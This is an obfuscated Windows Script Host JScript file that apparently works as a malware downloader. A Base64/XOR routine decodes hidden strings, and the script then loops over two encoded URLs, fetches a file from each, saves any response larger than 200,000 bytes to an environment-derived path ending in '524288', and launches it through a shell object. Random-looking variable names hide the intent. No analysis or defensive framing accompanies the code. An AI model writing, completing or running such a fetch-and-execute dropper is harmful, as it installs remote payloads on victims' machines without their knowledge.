var decode = function (packedText) {
    var cipher ="FRICVuNtlR4PYdTM";

    var Base64 = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

        decode: function (input) {
            var output = "";
            var chr1, chr2, chr3;
            var enc1, enc2, enc3, enc4;
            var i = 0;

            input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

            while (i < input.length) {

                enc1 = this._keyStr.indexOf(input.charAt(i++));
                enc2 = this._keyStr.indexOf(input.charAt(i++));
                enc3 = this._keyStr.indexOf(input.charAt(i++));
                enc4 = this._keyStr.indexOf(input.charAt(i++));

                chr1 = (enc1 << 2) | (enc2 >> 4);
                chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                chr3 = ((enc3 & 3) << 6) | enc4;

                output = output + String.fromCharCode(chr1);

                if (enc3 != 64) {
                    output = output + String.fromCharCode(chr2);
                }
                if (enc4 != 64) {
                    output = output + String.fromCharCode(chr3);
                }

            }

            output = Base64._utf8_decode(output);

            return output;

        },
        _utf8_decode: function (utftext) {
            var string = "";
            var i = 0;
            var c = c1 = c2 = 0;

            while (i < utftext.length) {

                c = utftext.charCodeAt(i);

                if (c < 128) {
                    string += String.fromCharCode(c);
                    i++;
                }
                else if ((c > 191) && (c < 224)) {
                    c2 = utftext.charCodeAt(i + 1);
                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                    i += 2;
                }
                else {
                    c2 = utftext.charCodeAt(i + 1);
                    c3 = utftext.charCodeAt(i + 2);
                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                    i += 3;
                }

            }
            return string;
        }
    };

    var text = Base64.decode(packedText);

    var cipherLength = cipher.length;
    var result = "";
    for (var i = 0; i < text.length; i++) {
        result += String.fromCharCode(text.charCodeAt(i) ^ cipher.charCodeAt(i % cipherLength));
    }
    return result;
};
(function() {
    var fallowWQb = 200;
    var dyspepticfov = decode('"ARcd"');
    var schemeF3X = decode('"AyosIA=="');
    var wantonMKq = decode('"EQEqMT8FOlo/OlE8NQ=="');
    var ramifyHuu = decode('"CwERDhpHYCwhHnwEDTQ="');
    var throngzHp = decode('"BxYGBxQ="');
    var squeamishR6q = decode('"FSY7JjcY"');
    var dregsl02 = decode('"YwYMDgZQEg=="');
    var sullyRwG = decode('"aDcxJg=="');
    var astringentDTm = 2e5;
    var obtainOQu = [ decode('"LiY9M2xaYRwJPlg/LgsmISIjODJ4FiEZQ2ACfjwcMQ=="'), decode('"LiY9M2xaYQMYNF0jPgs9IyE6LDEzEyhaDz1Zf2tSeig+Nw=="') ];
    var misanthropevzk = 524288;
    var cedel5g = WScript.CreateObject(wantonMKq);
    var advertrb0 = WScript.CreateObject(ramifyHuu);
    var mettleeOX = WScript.CreateObject(throngzHp + decode('"aA=="') + squeamishR6q);
    var adulationEJu = cedel5g.ExpandEnvironmentStrings(dregsl02);
    var forebodingM9T = adulationEJu + misanthropevzk + sullyRwG;
    var malleablevqG = false;
    for (var revelryop4 = 0; revelryop4 < obtainOQu.length; revelryop4++) {
        try {
            var wrangleEoS = obtainOQu[revelryop4];
            advertrb0.open(dyspepticfov, wrangleEoS, false);
            advertrb0.send();
            if (advertrb0.status == fallowWQb) {
                try {
                    mettleeOX.open();
                    mettleeOX.type = 1;
                    mettleeOX.write(advertrb0.responseBody);
                    if (mettleeOX.size > astringentDTm) {
                        revelryop4 = obtainOQu.length;
                        mettleeOX.position = 0;
                        mettleeOX.saveToFile(forebodingM9T, 2);
                        malleablevqG = true;
                    }
                } finally {
                    mettleeOX.close();
                }
            }
        } catch (ignored) {}
    }
    if (malleablevqG) {
        cedel5g[schemeF3X](adulationEJu + Math.pow(2, 19));
    }
})();